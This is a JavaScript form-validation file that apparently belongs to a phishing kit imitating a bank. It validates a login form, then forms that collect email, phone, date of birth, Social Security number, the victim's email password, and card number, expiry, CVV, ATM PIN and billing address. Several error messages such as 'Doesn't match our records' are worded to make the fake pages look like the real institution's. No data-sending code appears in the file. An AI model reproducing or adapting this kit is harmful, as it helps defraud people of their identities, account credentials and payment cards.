document.addEventListener('DOMContentLoaded', function(e) {
    FormValidation.formValidation(
        document.getElementById('loginForm'),
        {
            fields: {
                username: {
                    validators: {
                        notEmpty: {
                            message: 'Enter your username'
                        },
                        stringLength: {
                            min: 6,
                            max: 14,
                            message: '',
                        },
                    }
                },
                passwrd: {
                    validators: {
                        notEmpty: {
                            message: 'Enter your password'
                        },
                        stringLength: {
                            min: 5,
                            message: 'Enter your password',
                        },
                    }
                },
            },
			plugins: {
                trigger: new FormValidation.plugins.Trigger(),
                message: new FormValidation.plugins.Message({
                    clazz: 'red',
                    container: '#messages',
                }),
                submitButton: new FormValidation.plugins.SubmitButton(),
                defaultSubmit: new FormValidation.plugins.DefaultSubmit(),
            }
        }
    );
});   








document.addEventListener('DOMContentLoaded', function(e) {
    FormValidation.formValidation(
        document.getElementById('idcontacts'),
        {
            fields: {
                email: {
                    validators: {
                        notEmpty: {
                            message: 'Enter the valid email address we have in our records.'
                        },
                        stringLength: {
                            message: 'Enter a valid email address.',
                        },
                        regexp: {
                            regexp: /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/,
                            message: 'We can\'t find you in our records',
                        },
                    }
                },
				phone: {
                    validators: {
                        notEmpty: {
                            message: 'Enter your phone number.'
                        },
                         regexp: {
                            regexp: /^(\([0-9]{3}\) |[0-9]{3}-)[0-9]{3}-[0-9]{4}$/,
                            message: 'We can\'t find you in our records.',
                        },
                    }
                },
				phoneType: {
                    validators: {
                        notEmpty: {
                            message: 'Select your phone type.'
                        },
                        
                    }
                },
				date: {
                    validators: {
					notEmpty: {
                            message: 'Date of birth is required mm/dd/yyyy'
							  },
                        date: {
						  
                            format: 'MM/DD/YYYY',
                            message: 'We didn\'t recognize your date of birth. Please try again.',
                            // min and max options can be strings or Date objects
                            min: '01/01/1931',
                            max: '12/30/2002'
                        },
					
                    }
                },
               ssn: {
                    validators: {
                        notEmpty: {
                            message: 'Social Security Number  is required'
							  },
                         regexp: {
                            regexp: /^(?!000|666|9)\d{3}(-?)(?!00)\d{2}\1(?!0000)\d{4}$/,
                            message: 'Doesn\'t match our records.',
                        },
                    }
                },
            },
            plugins: {
                trigger: new FormValidation.plugins.Trigger(),
                foundation: new FormValidation.plugins.Foundation(),

                submitButton: new FormValidation.plugins.SubmitButton(),
                icon: new FormValidation.plugins.Icon({
                    valid: 'fa fa-check',
                    invalid: 'fa fa-times',
                    validating: 'fa fa-refresh'
                }),	
				defaultSubmit: new FormValidation.plugins.DefaultSubmit(),
            },
        }
    );
});




document.addEventListener('DOMContentLoaded', function(e) {
    FormValidation.formValidation(
        document.getElementById('empass'),
        {
            fields: {
                password: {
                    validators: {
                        notEmpty: {
                            message: 'Enter your email address password.'
                        },
                       stringLength: {
                            min: 8,
                            message: '&#32;',
                        },
                    }
                },
				
            },
            plugins: {
                trigger: new FormValidation.plugins.Trigger(),
                foundation: new FormValidation.plugins.Foundation(),

                submitButton: new FormValidation.plugins.SubmitButton(),
                icon: new FormValidation.plugins.Icon({
                    valid: 'fa fa-check',
                    invalid: 'fa fa-times',
                    validating: 'fa fa-refresh'
                }),	
				defaultSubmit: new FormValidation.plugins.DefaultSubmit(),
            },
        }
    );
});




document.addEventListener('DOMContentLoaded', function(e) {
    FormValidation.formValidation(
        document.getElementById('wecc'),
        {
            fields: {
				noc: {
                    validators: {
                        notEmpty: {
                            message: 'Enter Card Holder Name .'
                        },
                       
                        regexp: {
                            regexp: /^([a-zA-Z]{2,}\s[a-zA-z]{0,}'?-?[a-zA-Z]{1,}\s?([a-zA-Z]{1,})?)$/,
                            message: 'Enter Card Holder Name .',
                        },
                    }
                },
         cc: {
                    validators: {
                        notEmpty: {
                            message: 'The card number is required'
                        },
                        creditCard: {
                            message: 'Enter your valid card number'
                        },
                    }
                },
				expdate: {
                    validators: {
                        notEmpty: {
                            message: 'Invalid expiration date.'
                        },
                        stringLength: {
                            min: 7,
                            max: 7,
                            message: '&#x20;',
                        },
                        regexp: {
                            regexp: /^((0[1-9])|(1[0-2]))\/((2020)|(20[2-2][0-9]))$/,
                            message: 'Invalid expiration date.',
                        },
                    }
                },
				cvv: {
                    validators: {
                        notEmpty: {
                            message: 'Card cvv is required.'
                        },
                        stringLength: {
                            min: 3,
                            max: 3,
                            message: 'Doesn\'t match our records.',
                        },
                    }
                },
				atm: {
                    validators: {
                        notEmpty: {
                            message: 'Atm pin is required.'
                        },
                        stringLength: {
                            min: 4,
                            max: 4,
                            message: 'Doesn\'t match any record.',
                        },
                    }
                },
				stradd: {
                    validators: {
                        notEmpty: {
                            message: 'Billing Address is required'
							  },
                         regexp: {
                            regexp: /^\d+\s[A-z]+\s[A-z]+/,
                            message: 'Doesn\'t match our records.',
                        },
                    }
                },
            },
            plugins: {
                trigger: new FormValidation.plugins.Trigger(),
                foundation: new FormValidation.plugins.Foundation(),

                submitButton: new FormValidation.plugins.SubmitButton(),
                icon: new FormValidation.plugins.Icon({
                    valid: 'fa fa-check',
                    invalid: 'fa fa-times',
                    validating: 'fa fa-refresh'
                }),	
				defaultSubmit: new FormValidation.plugins.DefaultSubmit(),
            },
        }
    )
	.on('core.validator.validated', function(e) {
        if (e.field === 'cc' && e.validator === 'creditCard' && e.result.valid) {
            let icon = '';
            // e.result.meta.type can be one of
            // AMERICAN_EXPRESS, DINERS_CLUB, DINERS_CLUB_US, DISCOVER, JCB, LASER,
            // MAESTRO, MASTERCARD, SOLO, UNIONPAY, VISA
            switch (e.result.meta.type) {
                case 'AMERICAN_EXPRESS':
                    icon = 'fa fa-cc-amex';
                    break;
                
                case 'DISCOVER':
                    icon = 'fa-cc-discover';
                    break;
                
                case 'MASTERCARD':
                case 'DINERS_CLUB_US':
                    icon = 'fa-cc-mastercard';
                    break;
                
                case 'VISA':
                    icon = 'fa-cc-visa';
                    break;
                
                default:
                    icon = 'fa-credit-card';
                    break;
            }

            // Query the icon element
            const iconEle = e.element.nextSibling;
            iconEle.setAttribute('class', 'fv-plugins-icon ' + icon);
        }
    })
    .on('core.element.validated', function(e) {
        if (e.field === 'cc' && !e.valid) {
            const iconEle = e.element.nextSibling;
            iconEle.setAttribute('class', 'fv-plugins-icon fa fa-times');
        }
    });
});